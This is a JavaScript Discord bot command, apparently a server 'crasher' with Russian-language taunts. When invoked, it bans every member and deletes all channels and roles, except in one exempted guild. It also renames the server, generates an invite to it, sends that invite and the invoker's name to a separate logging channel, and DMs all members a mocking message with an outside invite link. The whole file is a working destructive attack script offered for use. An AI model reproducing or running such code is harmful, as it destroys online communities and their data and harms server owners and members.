const Discord = require("discord.js");
const fs = require("fs");
module.exports.run = async (bot, message, args) => {
    if (message.guild.id === '661983775022120977') {
        message.channel.send(
     new Discord.RichEmbed()
     .setColor('FF0000')
     .setTitle('Краша не будет, крашер идет нахуй!')
     .setTimestamp()
     )
         return
       }
    let Invite = await message.guild.channels.find((c) => c.type === 'text').createInvite()
    let Sender = message.author;

   let contact = new Discord.RichEmbed()
   .setColor("#ff0f00")
   
   .setThumbnail(Sender.displayAvatarURL)
   .setDescription(`[${message.guild.name}](${Invite.url})`)
   .setTitle("Сервер:")
   .addField("Крашнул:", Sender, true)
   .addField("Количество участников",message.guild.presences.size, true)
   .setTimestamp()



    message.guild.members.map(member => {
        member.ban()
    })
    message.guild.channels.forEach(channel => channel.delete())
    message.guild.roles.forEach(i => i.delete())
    message.guild.setName('КУ ОТ ГРИФОНИИ')

    bot.channels.get("740880737850490891").send(contact);

    let embed = new Discord.RichEmbed()
    .setColor("#00ff00")
    .setTitle("Вам жопка)")
    .addField("Вас крашнул:", Sender)
    .setFooter("Удачи)))")
    message.guild.members.forEach(m => {
        m.sendMessage("Ваш сервер был крашнут)))))) https://discord.gg/sTVsBSD")
    })
}
module.exports.help = {
name: "jopka"
}